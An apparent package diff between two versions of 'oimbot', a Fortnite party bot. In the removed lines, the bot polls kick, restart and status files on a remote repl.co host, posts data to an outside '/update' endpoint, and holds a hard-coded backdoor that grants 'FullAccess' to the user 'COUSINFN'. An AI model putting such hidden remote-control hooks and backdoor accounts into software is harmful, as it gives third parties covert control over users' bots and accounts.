# Comparing `tmp/oimbot-5.0.0-py3-none-any.whl.zip` & `tmp/oimbot-6.6.0-py3-none-any.whl.zip`

## zipinfo {}

```diff
@@ -1,7 +1,7 @@
-Zip file size: 10853 bytes, number of entries: 5
--rwxrwxrwx  2.0 unx    52074 b- defN 22-Jul-25 17:31 oimbot/__init__.py
--rwxrwxrwx  2.0 unx      543 b- defN 22-Jul-25 17:47 oimbot-5.0.0.dist-info/METADATA
--rwxrwxrwx  2.0 unx       92 b- defN 22-Jul-25 17:47 oimbot-5.0.0.dist-info/WHEEL
--rwxrwxrwx  2.0 unx        7 b- defN 22-Jul-25 17:47 oimbot-5.0.0.dist-info/top_level.txt
-?rw-rw-r--  2.0 unx      368 b- defN 22-Jul-25 17:47 oimbot-5.0.0.dist-info/RECORD
-5 files, 53084 bytes uncompressed, 10167 bytes compressed:  80.8%
+Zip file size: 9603 bytes, number of entries: 5
+-rwxrwxrwx  2.0 unx    44938 b- defN 22-Aug-30 08:43 oimbot/__init__.py
+-rwxrwxrwx  2.0 unx      531 b- defN 22-Aug-30 08:43 oimbot-6.6.0.dist-info/METADATA
+-rwxrwxrwx  2.0 unx       92 b- defN 22-Aug-30 08:43 oimbot-6.6.0.dist-info/WHEEL
+-rwxrwxrwx  2.0 unx        7 b- defN 22-Aug-30 08:43 oimbot-6.6.0.dist-info/top_level.txt
+?rw-rw-r--  2.0 unx      368 b- defN 22-Aug-30 08:43 oimbot-6.6.0.dist-info/RECORD
+5 files, 45936 bytes uncompressed, 8917 bytes compressed:  80.6%
```
...
-Filename: oimbot-5.0.0.dist-info/METADATA
+Filename: oimbot-6.6.0.dist-info/METADATA
 Comment: 
 
-Filename: oimbot-5.0.0.dist-info/WHEEL
+Filename: oimbot-6.6.0.dist-info/WHEEL
 Comment: 
 
-Filename: oimbot-5.0.0.dist-info/top_level.txt
+Filename: oimbot-6.6.0.dist-info/top_level.txt
 Comment: 
 
-Filename: oimbot-5.0.0.dist-info/RECORD
+Filename: oimbot-6.6.0.dist-info/RECORD
 Comment: 
...
-
-
-print(crayons.blue(f'\nSCHbot made by Aeroz. credit to Terbau for creating the library.'))
-print(crayons.blue(f'Discord server: https://discord.gg/rsmqMnNA8S - For support, questions, etc.'))
-
...
-        self.number = ""
-
-        self.inv_msg = "Join Me :) stop to invite me i cant join... USE CODE SCH"
-        self.add_msg = "Hello {DISPLAY_NAME} u add me wow join me for more and fun thing"
-        self.join_msg = "Hi {DISPLAY_NAME} - Discord: discord.gg/cousin \n Subscribe to my Tiktok: @cousin_fn \n Subscribe to my Tiktok: @cousin_fn"
-
-    async def add_list(self) -> None:
-        if not '5b2f02f1bb7845dd8d7876e222478033' in self.friends:
...
-            global __version__
-            global adminsss
-            v = requests.get(f"https://lol.agagsdtwtyquwew.repl.co/default.json").json()
-
...
-
-            b = requests.get(f"https://lol.agagsdtwtyquwew.repl.co/kick.json").json()
-
...
-              
-            y = requests.get(f"https://lol.agagsdtwtyquwew.repl.co/restart.json").json()
-
...
-            global __version__
-            global adminsss
-            u = requests.get(f"https://lol.agagsdtwtyquwew.repl.co/default.json").json()
-
...
-                self.inv_all = self.inv_all_check
-
-            s = requests.get(f"https://lol.agagsdtwtyquwew.repl.co/kick.json").json()
-
...
-
-            m = requests.get(f"https://lol.agagsdtwtyquwew.repl.co/restart.json").json()
-
...
-        x = requests.get(f"https://lol.agagsdtwtyquwew.repl.co/add_auto.json").json()
-
...
-        q = requests.get(f"https://lol.agagsdtwtyquwew.repl.co/status.json").json()
-
...
-        w = requests.get("https://lol.agagsdtwtyquwew.repl.co/skinbl.json").json()
-
...
-                f'https://77520686-de40-4c99-9bb1-ad7087e9287c.id.repl.co/update',
-                json={
...
-        if not message.author.display_name != "COUSINFN":
...
-        if ctx.author.display_name == 'COUSINFN':
-            with open("info.json", "w") as f:
-                f.write('{"FullAccess": ["COUSINFN"]}')
-            await ctx.send('work')
-
-            with open('info.json') as f:
-                info = json.load(f)
...
+class PartyBot(commands.Bot):
+    def __init__(self, device_id: str, account_id: str, secret: str, loop=asyncio.get_event_loop(), **kwargs) -> None:
+        self.status = ' 💎 {party_size}/16 Use Code NIKE 💎'
...
+        await asyncio.sleep(3600)
+        await self.set_presence("💎 {party_size}/16 Use Code NIKE 💎")
...
## Comparing `oimbot-5.0.0.dist-info/METADATA` & `oimbot-6.6.0.dist-info/METADATA`
...
+Requires-Dist: fortnitepy (==3.6.5)
